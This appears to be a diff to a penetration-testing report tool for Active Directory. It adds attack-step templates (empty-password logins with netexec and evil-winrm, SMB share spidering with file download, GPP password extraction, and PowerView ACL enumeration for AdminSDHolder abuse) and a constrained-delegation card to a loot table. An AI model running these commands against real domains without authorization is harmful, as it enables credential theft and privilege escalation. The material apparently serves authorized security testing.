@@ -293,6 +293,67 @@ ATTACK_TEMPLATES = {
         ]
     },
 
+    # -----------------------------------------------------------------------
+    "password_not_required": {
+        "title": "Empty / Blank Password Login",
+        "phase": "Credential Access",
+        "steps": [
+            {
+                "desc": "Try empty password against the account",
+                "cmd":  'netexec smb {DC_IP} -u {EVIDENCE_0} -p ""',
+            },
+            {
+                "desc": "Test WinRM with empty password",
+                "cmd":  'evil-winrm -i {DC_IP} -u {EVIDENCE_0} -p ""',
+            },
+            {
+                "desc": "LDAP bind with empty password (from Linux)",
+                "cmd":  'netexec ldap {DC_IP} -u {EVIDENCE_0} -p ""',
+            },
+        ]
+    },
+
+    # -----------------------------------------------------------------------
+    "smb_shares": {
+        "title": "SMB Share Enumeration & Credential Hunt",
+        "phase": "Enumeration → Credential Access",
+        "steps": [
+            {
+                "desc": "List all shares and permissions",
+                "cmd":  'netexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} --shares',
+            },
+            {
+                "desc": "Spider shares and download interesting files",
+                "cmd":  'netexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M spider_plus -o DOWNLOAD_FLAG=True',
+            },
+            {
+                "desc": "Check SYSVOL for Group Policy with stored credentials (GPP passwords)",
+                "cmd":  'netexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M gpp_password',
+            },
+            {
+                "desc": "Mount a specific share for manual inspection",
+                "cmd":  'smbclient //{DC_IP}/<SHARE_NAME> -U "{DOMAIN}\\{USERNAME}%{PASSWORD}"',
+            },
+        ]
+    },
+
+    # -----------------------------------------------------------------------
+    "admincount_users": {
+        "title": "AdminSDHolder ACL Abuse Paths",
+        "phase": "Privilege Escalation",
+        "steps": [
+            {
+                "desc": "Use BloodHound to find ACL paths leading to AdminSDHolder accounts",
+                "cmd":  '# In BloodHound: Search → Shortest Paths to High Value Targets',
+                "note": "AdminCount=1 accounts are protected by AdminSDHolder — check who has GenericAll/WriteDACL on them.",
+            },
+            {
+                "desc": "Enumerate ACLs on a specific protected account with PowerView",
+                "cmd":  'Get-DomainObjectAcl -Identity {EVIDENCE_0} -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner|GenericWrite" }',
+            },
+        ]
+    },
+
 }
 
 
@@ -625,8 +686,9 @@ def _loot_table_html(loot):
         _loot_card("AS-REP Roastable",        loot["asrep_roastable"],    "lh-orange"),
         _loot_card("Service Principal Names", loot["spns"],               "lh-yellow"),
         _loot_card("NTLM Hashes Found",       loot["hashes_found"],       "lh-red"),
-        _loot_card("Cleartext Passwords",     loot["passwords_found"],    "lh-red"),
-        _loot_card("Password Policy",         loot["password_policy"],    "lh-blue"),
+        _loot_card("Cleartext Passwords",     loot["passwords_found"],        "lh-red"),
+        _loot_card("Constrained Delegation",  loot.get("constrained_delegation", []), "lh-orange"),
+        _loot_card("Password Policy",         loot["password_policy"],        "lh-blue"),
         _loot_card("Domain Trusts",           loot["domain_trusts"],      "lh-yellow"),
         _loot_card("GPOs",                    loot["gpos"],               "lh-gray"),
         _loot_card("Interesting Files",       loot["interesting_files"],  "lh-yellow"),
